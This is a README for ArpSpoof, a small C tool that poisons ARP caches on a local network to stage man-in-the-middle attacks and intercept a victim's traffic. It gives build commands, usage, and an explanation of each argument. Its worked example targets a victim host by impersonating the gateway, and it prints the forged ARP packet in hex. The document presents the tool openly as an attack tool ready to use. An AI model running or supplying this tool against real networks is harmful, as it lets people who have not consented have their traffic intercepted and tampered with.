# ArpSpoof: ARP cache poisoner

ArpSpoof is a simple ARP cache poisoning program coded in C. This a very little and simple tool, which provides an interface to throw a Man In The Middle attack in a local network and intercep the network traffic of the victim. 

- Synopsis
- Description
- Options
- Example
- Links

# Synopsis

Building the ARPSpoof program.

```
$ git clone https://github.com/VincentDary/ArpSpoof.git
$ cd ArpSpoof
$ make && make clean
```

Usage:

```
# ./ArpSpoof
#  usage: ArpSpoof <interface> <target mac> <target IPv4> <source mac> <fake IPv4>
```

# Description

ArpSpoof is a ARP cache poisoning program for the MITM attack based on ARP poisoning, more information about this [attack](https://www.information-security.fr/attaque-man-in-the-middle-via-arp-spoofing/).

# Options

- **_interface_**

The network interface where to start the ARP packets injection.


- **_target mac_**

The target MAC address of the victim.


- **_target IPv4_**

The target IPv4 address of the victim.


- **_source mac_**

The source MAC address associated to the <interface> parameter, where the ARP packets injection is started.


- **_fake IPv4_**

The IPv4 address to usurp.


Note:

This tool doesn't forward the network traffic of the victim. It's more flexible solution. You can use an other tool for this or enable it on your machine or on the machine where the network traffic is redirect. 

## Example

 Use example with the following network configuration:

- Attacker:
Network interface = eth0
MAC address = 00:11:50:22:55:14
- Victim:
IPv4 = 192.168.1.56
MAC address = 00:A0:D1:DC:79:80
- Gateway:
IPv4 = 192.168.1.1

```
#./ArpSpoof eth0 00:A0:D1:DC:79:80 192.168.1.56 00:11:50:22:55:14 192.168.1.1

  ARP packet write on wire, 42 bytes :

 00 a0 d1 dc 79 80 00 11   50 22 55 14 08 06 00 01  |  ....y...  P"U.....
 08 00 06 04 00 01 00 11   50 22 55 14 c0 a8 01 01  |  ........  P"U.....
 00 a0 d1 dc 79 80 c0 a8   01 38 .. .. .. .. .. ..  |  ....y...  .8

```

## Links

[1] MITM attack based on ARP poisoning:

[ https://www.information-security.fr/attaque-man-in-the-middle-via-arp-spoofing/]( https://www.information-security.fr/attaque-man-in-the-middle-via-arp-spoofing/)


